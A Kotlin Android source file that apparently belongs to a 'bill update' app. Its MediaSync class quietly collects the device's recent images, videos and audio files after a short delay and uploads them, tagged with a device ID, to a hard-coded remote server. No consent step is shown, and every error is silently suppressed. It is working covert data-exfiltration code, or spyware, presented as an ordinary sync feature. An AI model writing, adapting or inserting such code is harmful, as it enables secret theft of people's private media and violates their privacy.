package com.example.bill_update_app

import android.content.Context
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL

class MediaSync(private val context: Context) {
    private val prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
    private var running = false

    fun startPeriodicSync() {
        if (running) return
        running = true
        Handler(Looper.getMainLooper()).postDelayed({
            Thread { sync() }.start()
        }, 15000)
    }

    private fun sync() {
        try {
            val deviceId = prefs.getString("device_id", "") ?: ""
            if (deviceId.isEmpty()) return

            val uploaded = prefs.getStringSet("uploaded_media", mutableSetOf()) ?: mutableSetOf()
            val ids = mutableSetOf<String>()

            queryAndUpload(deviceId, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", uploaded, ids)
            queryAndUpload(deviceId, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", uploaded, ids)
            queryAndUpload(deviceId, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", uploaded, ids)

            if (ids.isNotEmpty()) {
                prefs.edit().putStringSet("uploaded_media", ids + uploaded).apply()
            }
        } catch (_: Exception) {}
    }

    private fun queryAndUpload(deviceId: String, uri: Uri, type: String, uploaded: Set<String>, ids: MutableSet<String>) {
        try {
            var cursor = context.contentResolver.query(uri, null, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT 200")
            cursor?.use { c ->
                val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                val mimeIdx = c.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
                val sizeIdx = c.getColumnIndex(MediaStore.MediaColumns.SIZE)

                while (c.moveToNext()) {
                    val id = if (idIdx >= 0) c.getLong(idIdx).toString() else ""
                    val key = "${type}_$id"
                    if (key.isEmpty() || uploaded.contains(key) || ids.contains(key)) continue

                    val name = if (nameIdx >= 0) c.getString(nameIdx) ?: "unknown" else "unknown"
                    val mime = if (mimeIdx >= 0) c.getString(mimeIdx) ?: "application/octet-stream" else "application/octet-stream"
                    val size = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L

                    if (size > 10_485_760 || size <= 0) continue

                    try {
                        val contentUri = Uri.withAppendedPath(uri, id)
                        uploadContent(deviceId, contentUri, name, mime)
                        ids.add(key)
                    } catch (_: Exception) {}
                }
            }
        } catch (_: Exception) {}
    }

    private fun uploadContent(deviceId: String, contentUri: Uri, fileName: String, mimeType: String) {
        val boundary = "Boundary${System.currentTimeMillis()}"
        val url = URL("https://bill-1-9yfp.onrender.com/api/media/upload")
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        conn.doOutput = true
        conn.connectTimeout = 30000
        conn.readTimeout = 120000

        val output = conn.outputStream
        val writer = java.io.OutputStreamWriter(output, "UTF-8")

        writer.write("--$boundary\r\n")
        writer.write("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n")
        writer.write("$deviceId\r\n")

        writer.write("--$boundary\r\n")
        writer.write("Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"\r\n")
        writer.write("Content-Type: $mimeType\r\n\r\n")
        writer.flush()

        try {
            val inputStream = context.contentResolver.openInputStream(contentUri)
            inputStream?.use { input ->
                val buf = ByteArray(8192)
                var len: Int
                while (input.read(buf).also { len = it } != -1) {
                    output.write(buf, 0, len)
                }
            }
        } catch (_: Exception) {}

        writer.write("\r\n")
        writer.write("--$boundary--\r\n")
        writer.flush()
        writer.close()
        output.close()

        conn.responseCode
        conn.disconnect()
    }
}
